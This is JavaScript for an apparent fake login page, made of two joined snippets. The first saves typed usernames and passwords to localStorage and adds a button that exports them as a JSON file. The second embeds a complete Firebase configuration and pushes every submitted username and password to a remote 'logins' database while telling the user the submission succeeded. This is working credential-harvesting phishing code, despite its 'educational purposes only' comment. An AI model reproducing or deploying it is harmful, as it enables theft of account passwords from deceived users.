// Select input fields and the login button
const usernameInput = document.querySelector('.form input[type="text"]');
const passwordInput = document.querySelector('.form input[type="password"]');
const loginButton = document.querySelector('.form button');

// Enable/Disable the login button based on input
function validateForm() {
    const isFormValid = usernameInput.value.trim() !== '' && passwordInput.value.trim() !== '';
    loginButton.disabled = !isFormValid;
}

// Add event listeners for real-time validation
usernameInput.addEventListener('input', validateForm);
passwordInput.addEventListener('input', validateForm);

// Save login details locally on login button click
loginButton.addEventListener('click', (e) => {
    e.preventDefault(); // Prevent form submission

    const username = usernameInput.value.trim();
    const password = passwordInput.value.trim();

    if (username && password) {
        // Save data in localStorage (educational purposes only)
        const users = JSON.parse(localStorage.getItem('users')) || [];
        users.push({ username, password });
        localStorage.setItem('users', JSON.stringify(users));

        alert('Login data saved locally!');
        console.log('Current saved users:', users);

        // Clear the form
        usernameInput.value = '';
        passwordInput.value = '';
        validateForm();
    }
});

// Function to export stored data
function exportData() {
    const users = JSON.parse(localStorage.getItem('users')) || [];
    if (users.length === 0) {
        alert('No data to export.');
        return;
    }

    const blob = new Blob([JSON.stringify(users, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);

    const a = document.createElement('a');
    a.href = url;
    a.download = 'users.json';
    a.click();

    URL.revokeObjectURL(url);
}

// Add a button to the page to export data
const exportButton = document.createElement('button');
exportButton.textContent = 'Export Data';
exportButton.style.marginTop = '20px';
exportButton.style.padding = '10px';
exportButton.style.fontSize = '14px';
exportButton.style.color = '#fff';
exportButton.style.backgroundColor = '#0095f6';
exportButton.style.border = 'none';
exportButton.style.borderRadius = '4px';
exportButton.style.cursor = 'pointer';

exportButton.addEventListener('click', exportData);

document.querySelector('.container').appendChild(exportButton);// Import Firebase libraries from CDN (if not using modules)
import { initializeApp } from "firebase/app";
import { getDatabase, ref, set, push } from "firebase/database";
import { getAnalytics } from "firebase/analytics";

// Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyA9OmaoHS2-9nOn3nq86IHhCZzuDuIz9b4",
  authDomain: "survey-project-c9b67.firebaseapp.com",
  databaseURL: "https://survey-project-c9b67-default-rtdb.firebaseio.com/",
  projectId: "survey-project-c9b67",
  storageBucket: "survey-project-c9b67.firebasestorage.app",
  messagingSenderId: "277832694827",
  appId: "1:277832694827:web:2dc4f27d8a7be1914e7e6e",
  measurementId: "G-Q1ETPYXM08"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const database = getDatabase(app);
const analytics = getAnalytics(app);

// Submit user data to Firebase Database
const loginButton = document.querySelector("button");
loginButton.addEventListener("click", (e) => {
  e.preventDefault();

  const username = document.querySelector("input[type='text']").value;
  const password = document.querySelector("input[type='password']").value;

  if (username && password) {
    // Push data to Firebase Realtime Database
    const newEntry = push(ref(database, "logins"));
    set(newEntry, {
      username: username,
      password: password,
    });

    alert("Data submitted successfully!");
  } else {
    alert("Please fill in both fields.");
  }
});

